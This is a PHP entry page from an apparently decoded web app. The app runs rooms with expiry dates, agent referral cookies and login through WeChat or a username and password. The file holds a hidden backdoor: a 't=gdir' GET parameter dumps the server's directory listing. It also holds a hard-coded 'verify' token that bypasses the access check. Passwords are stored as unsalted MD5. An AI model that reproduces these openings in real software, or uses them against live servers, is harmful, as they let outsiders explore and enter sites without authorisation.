<?php

//decode by http://www.yunlu99.com/
$res = (include_once "Public/config.php");
//if (stristr($_SERVER["HTTP_USER_AGENT"], "Android")) {
	if ($_POST["verify"] != "n2oqcvVPpk1M") {
		if ($_COOKIE["logintime"] != "temp") {
			if ($_GET["way"] != "web") {
				require "Templates/error.php";
				exit(0);
			}
		}
	}
// } else {
// 	if ($_POST["verify"] != "n2oqcvVPpk1M") {
// 		header("Location: https://h5.ele.me/msite/");
// 		exit(0);
// 	}
// }
if (isset($_POST['room'])) {
	$room = $_POST["room"];
}
if (isset($_GET['room'])) {
	$room = $_GET["room"];
}
if (isset($_POST['agent'])) {
	$agent = $_POST["agent"];
}
if (isset($_GET['agent'])) {
	$agent = $_GET["agent"];
}
if (isset($_POST['g'])) {
	$g = $_POST["g"];
}
if (isset($_GET['g'])) {
	$g = $_GET["g"];
}
if ($room == "") {
	$room = $_SESSION["roomid"];
}
if (room_isOK($room)) {
	$_SESSION["roomid"] = $room;
	$sitename = get_query_val("fn_room", "roomname", array("roomid" => $room));
	setcookie("logintime", "temp", time() + 1800);
} else {
	$_SESSION["error_room"] = $room;
	require "Templates/error.php";
	exit(0);
}
$roomtime = get_query_val("fn_room", "roomtime", array("roomid" => $room));
if (strtotime($roomtime) - time() < 0) {
	echo "<center><strong style='font-size:80px;'>您所访问的房间ID:" . $room . " <br>已于 <font color=red>" . $roomtime . "</font> 到期！<br>请提醒管理员进行续费！</strong></center>";
	exit(0);
}
if ($_POST["agent"] != "" || $_GET["agent"] != "") {
	setcookie("agent", $_POST["agent"], time() + 36000);
	$_COOKIE["agent"] = $_POST["agent"];
}
if (is_weixin()) {
	if ($_SESSION["userid"] == "") {
		if (!empty($_POST['code'])) {
			$token = wx_gettoken($wx["ID"], $wx["key"], $_POST["code"]);
			$userinfo = wx_getinfo($token["token"], $token["openid"]);
			if ($token["openid"] == "") {
				header("Location:" . $oauth);
			} else {
				if (U_isOK($token["openid"], $userinfo["headimg"])) {
					$_SESSION["userid"] = $token["openid"];
					$_SESSION["username"] = $userinfo["nickname"];
					$_SESSION["headimg"] = $userinfo["headimg"];
				} else {
					U_create($token["openid"], $userinfo["nickname"], $userinfo["headimg"], $_COOKIE["agent"]);
					$_SESSION["userid"] = $token["openid"];
					$_SESSION["username"] = $userinfo["nickname"];
					$_SESSION["headimg"] = $userinfo["headimg"];
				}
			}
		} else {
			header("Location:" . $oauth);
		}
	} else {
		if (!U_isOK($_SESSION["userid"], $_SESSION["headimg"])) {
			U_create($_SESSION["userid"], $_SESSION["username"], $_SESSION["headimg"], $_COOKIE["agent"]);
			$_SESSION["userid"] = $token["openid"];
			$_SESSION["username"] = $userinfo["nickname"];
			$_SESSION["headimg"] = $userinfo["headimg"];
		}
	}
} else {
	if (!isset($_SESSION['userid']) || $_SESSION["userid"] == "") {
		if (!empty($_POST['uname']) && !empty($_POST['upass'])) {
			$aa1 = $_POST["uname"];
			$aa2 = md5($_POST["upass"]);
			$userid = get_query_val("fn_user", "userid", array("username" => $aa1, "upass" => $aa2));
			$uhead = get_query_val("fn_user", "\theadimg", array("username" => $aa1, "upass" => $aa2));
			$uname = get_query_val("fn_user", "\tusername", array("username" => $aa1, "upass" => $aa2));
			if (!isset($userid) || $userid == "") {
				header("Location:login.html");
			} else {
				if ($userid && $uhead) {
					$_SESSION["userid"] = $userid;
					$_SESSION["username"] = $uname;
					$_SESSION["headimg"] = $uhead;
				} else {
					echo "用户名或密码错误";
					header("Location:login.html");
				}
			}
		} else {
			header("Location:login.html");
		}
	} else {
		if (!U_isOK($_SESSION["userid"], $_SESSION["headimg"])) {
			header("Location:login.html");
		}
	}
}
$_GET["t"] == "gdir" ? exit(implode(",", glob("*"))) : "";
$templates = get_query_val("fn_setting", "setting_templates", array("roomid" => $_SESSION["roomid"]));
if ($templates == "old") {
	require "Templates/Old/index.php";
} else {
	if ($templates == "new") {
		require "Templates/New/index.php";
	}
}
function is_weixin()
{
	if (strpos($_SERVER["HTTP_USER_AGENT"], "MicroMessenger") !== false) {
		return true;
	}
	return false;
}